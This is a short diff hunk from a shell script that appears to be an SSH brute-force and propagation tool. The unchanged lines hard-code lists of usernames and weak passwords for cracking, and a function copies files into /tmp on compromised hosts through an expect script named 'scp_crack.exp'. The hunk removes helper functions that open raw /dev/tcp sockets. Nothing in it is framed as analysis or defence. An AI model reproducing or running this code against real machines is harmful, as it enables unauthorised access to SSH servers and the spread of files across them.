@@ -107,18 +107,6 @@ ICAgICAgIGVvZiB7IGV4aXQgMCB9Cn0K"
 ssh_crack_user=("root" "wzt")
 ssh_crack_passwd=("123456" "111" "giveshell" "afafa" "afafdfafdf")
 
-bmw_socket_create()
-{
-        exec 1024<> /dev/tcp/$1/$2
-        [ $? -eq 0 ] && echo "connect to $1:$2 ok." || echo "connect to $1:$2 failed."
-}
-
-bmw_socket_close()
-{
-        exec >&1024-
-        [ $? -ne 0 ] && echo "close socket failed."
-}
-
 bmw_ssh_copy_file()
 {
 	./scp_crack.exp $2 $user $1 "/tmp" 4 $passwd
